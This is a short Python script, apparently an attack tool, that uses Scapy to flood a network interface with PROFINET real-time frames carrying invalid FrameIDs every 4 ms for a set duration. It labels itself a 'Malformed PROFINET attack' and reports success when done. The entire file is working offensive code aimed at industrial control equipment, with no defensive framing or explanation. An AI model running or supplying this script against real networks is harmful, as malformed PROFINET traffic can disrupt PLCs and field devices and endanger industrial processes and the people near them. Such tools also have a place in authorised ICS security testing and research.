import argparse
import random
import struct
import time
from scapy.all import Ether, conf


INVALID_FRAME_IDS = [
    0x0001,
    0xFFFF,
    0x7000,
    0xC500,
    0x0800,
]


def build_malformed_frame(frame_id, cycle_counter):
    header = struct.pack(">HHBB", frame_id, cycle_counter, 0x35, 0x00)
    payload = header + bytes(40)
    return Ether(src = "08:00:27:a0:f4:9c", dst = "01:0e:cf:00:00:00", type = 0x8892) / payload
    



def malformed_attack(iface, duration_s, cycle_ms=4.0):
    l2_socket = conf.L2socket(iface = iface)
    cycle_counter = 0
    frame_sent = 0
    start = time.perf_counter()
    
    try:
        while time.perf_counter() - start < duration_s:
            frame_id = random.choice(INVALID_FRAME_IDS)
            frame = build_malformed_frame(frame_id, cycle_counter)
            l2_socket.send(frame)
            cycle_counter = (cycle_counter+1) % 65536
            frame_sent+=1
            time.sleep(cycle_ms/1000)
    finally:
        l2_socket.close()
    
    print(f"Malformed attack successful. {frame_sent} frames sent with invalid FrameID")
    


def parse_args():
    p = argparse.ArgumentParser(description = "Malformed PROFINET attack")
    p.add_argument("--iface", default = "eth0")
    p.add_argument("--duration", default = 300, type = int)
    return p.parse_args()


if __name__ == "__main__":
    args = parse_args()
    malformed_attack(args.iface, args.duration)
